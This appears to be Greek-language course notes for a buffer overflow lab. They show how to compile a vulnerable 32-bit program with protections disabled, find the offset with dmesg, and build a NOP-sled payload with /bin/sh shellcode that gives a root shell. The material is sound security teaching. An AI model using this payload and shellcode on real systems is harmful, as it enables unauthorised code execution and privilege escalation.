# Εισαγωγή σε Buffer Overflow Attacks

## Διαλέξεις

- [Διάλεξη 1](https://delos.uoa.gr/opendelos/videolecture/show?rid=46f847a7)
- [Διάλεξη 2](https://delos.uoa.gr/opendelos/videolecture/show?rid=3cc57c8c)

## Περιεχόμενο

- Αναλύσαμε τη δομή της στοίβας κατά την κλήση συναρτήσεων.
- Συζητήσαμε το shell code injection, δηλαδή την εισαγωγή και εκτέλεση κώδικα μέσω buffer overflow.
- Αναφερθήκαμε στα environment variables.
- Εξηγήσαμε τους μηχανισμούς προστασίας μνήμης (writable, readable, executable).
- Για το συγκεκριμένο exploit:
  - Θα κάνουμε compile με απενεργοποιημένο το Stack Canaries.
  - Θα κάνουμε compile ώστε η περιοχή μνήμης της στοίβας να είναι executable.
  - Θα κάνουμε compile ως 32-bit executable.

## Οδηγίες για το Compile του buf0.c

Για να κάνεις compile το `buf0.c` με απενεργοποιημένο το Stack Canaries, με executable stack, και ως 32-bit executable, χρησιμοποίησε τις παρακάτω εντολές:

```sh
sudo apt update
sudo apt install libc6-dev-i386
gcc -fno-stack-protector -z execstack -m32 -o buf0 buf0.c
```

### Γιατί κάνουμε compile ως 32-bit executable

Όταν κάνουμε compile το πρόγραμμα ως 64-bit executable, οι διευθύνσεις στη στοίβα περιέχουν μηδενικά στα υψηλότερα bits. Αυτό δημιουργεί πρόβλημα όταν προσπαθούμε να εισάγουμε αυτές τις διευθύνσεις στο payload, καθώς το `\x00` θεωρείται ως τερματικός χαρακτήρας string και το terminal το αγνοεί. Ακόμα και αν δεν το αγνοούσε, θα προκαλούσε πρόωρο τερματισμό της `strcpy`, διακόπτοντας τη διαδικασία buffer overflow.

Μια πιθανή λύση θα ήταν να γράψουμε το script κάτω από τη διεύθυνση επιστροφής, αλλά αυτό δεν έχει δοκιμαστεί και θα λειτουργούσε μόνο αν το buffer είναι αρκετά μεγάλο για να αποθηκεύσει το script. Για να αποφύγουμε αυτά τα προβλήματα, κάνουμε compile το πρόγραμμα ως 32-bit executable, όπου οι διευθύνσεις δεν περιέχουν μηδενικά στα υψηλότερα bits.

## Διαδικασία Εκτέλεσης του Exploit

Σε αυτή την άσκηση, θα κάνουμε το ίδιο exploit με την προηγούμενη, αλλά αυτή τη φορά δεν έχουμε τη συνάρτηση `thank_you` στο εκτελέσιμο στην οποία μπορούμε να περάσουμε τον έλεγχο και να έχει έτοιμο κώδικα που να μας δίνει root access. Παρόλα αυτά, θα προσπαθήσουμε να προσθέσουμε τον κώδικα οι ίδιοι μέσω του buffer overflow και να κάνουμε return σε αυτόν.

Στην ουσία, γράφουμε τα bit που αντιστοιχούν στις assembly εντολές του κώδικα που θέλουμε να τρέξουμε πάνω στην στοίβα και βάζουμε το return address να επιστρέψει σε αυτές. Παρόλα αυτά, επειδή το να υπολογίζουμε ακριβείς διευθύνσεις όπου θα πρέπει να κάνουμε το return κτλπ, και επειδή αυτά τείνουν κιόλας να αλλάζουν λίγο ανάλογα με καταστάσεις όπως αλλαγές στα environment variables, θα προσθέτουμε μια NOP sled πριν το shell code. Η NOP sled είναι στην ουσία μια ακολουθία NOP εντολών που δεν κάνουν τίποτα. Αν κάνουμε return πάνω σε αυτές, απλά θα τρέξουν μέχρι να χτυπήσουμε εν τέλει το shell code.

Για να βρεις το offset και τη διεύθυνση επιστροφής, μπορείς να πειραματιστείς με απλά payloads και να χρησιμοποιήσεις την εντολή `dmesg` για να δεις τα αποτελέσματα. Ένα παράδειγμα script για να βρεις το offset είναι το εξής:

```python
import sys

offset = b"AAAA" * 19  # Adjust the number of "AAAA" to find the correct offset

ret_address = b"BBBB"  # Placeholder for the return address

payload = offset + ret_address

sys.stdout.buffer.write(payload)
```

Τρέξε το παραπάνω script και εκτέλεσε το πρόγραμμα με το παραγόμενο payload. Στη συνέχεια, όταν προκύψει segfault, δες τα αποτελέσματα της εντολής:

```sh
sudo dmesg | tail
```

Θα δεις κάτι σαν αυτό:

```
[85652.190904] buf0[84857]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffcde0 error 14 likely on CPU 5 (core 1, socket 0)
[85652.190967] Code: Unable to access opcode bytes at 0x42424218.
```

Από αυτό το αποτέλεσμα, μπορείς να δεις ότι το `ip` (instruction pointer) έχει τη διεύθυνση `0x42424242`, που αντιστοιχεί στο ASCII "BBBB". Αυτό σημαίνει ότι έχεις βρει το σωστό offset.

Για να βρεις τη διεύθυνση επιστροφής, μπορείς να χρησιμοποιήσεις την τιμή του `sp` (stack pointer) από το αποτέλεσμα του `dmesg`. Στο παραπάνω παράδειγμα, η τιμή είναι `0xffffcde0`. Πρόσθεσε σε αυτή κάτι για να δημιουργήσεις μια διεύθυνση κάπου μέσα στην περιοχή των NOPs (επειδή έβαλα 1000 NOPS προσθέτω 500):

```python
import sys
import struct

offset = b"AAAA" * 19  # Adjust the number of "AAAA" to find the correct offset

# Return address in little-endian format, adding 500 to the original address
ret_address = struct.pack("<I", 0xffffcde0 + 500)

# NOP sled
nop_sled = b"\x90" * 1000  # Adjust the size of the NOP sled as needed

shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73"
    b"\x68\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    b"\xcd\x80\x31\xc0\x40\xcd\x80"
)

payload = offset + ret_address + nop_sled + shellcode

sys.stdout.buffer.write(payload)
```

- Το πρώτο μέρος του shell code (`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3`) περιέχει τις εντολές για να φορτώσει το string "/bin/sh" στη μνήμη.
- Το δεύτερο μέρος (`\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`) περιέχει τις εντολές για να εκτελέσει το "/bin/sh" με δικαιώματα root και να τερματίσει το πρόγραμμα.

## Σημείωση

Βεβαιώσου ότι το payload δεν περιέχει null bytes (`\x00`), καθώς αυτά μπορεί να τερματίσουν πρόωρα το string. Επίσης, η χρήση 32-bit executable είναι απαραίτητη για να αποφύγεις τα null bytes στις διευθύνσεις της στοίβας.

## Εκτέλεση του Exploit

Για να τρέξεις το exploit, χρησιμοποίησε την παρακάτω διαδικασία:

1. Δημιούργησε το payload χρησιμοποιώντας Python script:

   ```sh
   python3 exploit2.py > payload
   ```

2. Τρέξε το πρόγραμμα με το παραγόμενο payload:
   ```sh
   sudo ./buf0 `cat payload`
   ```
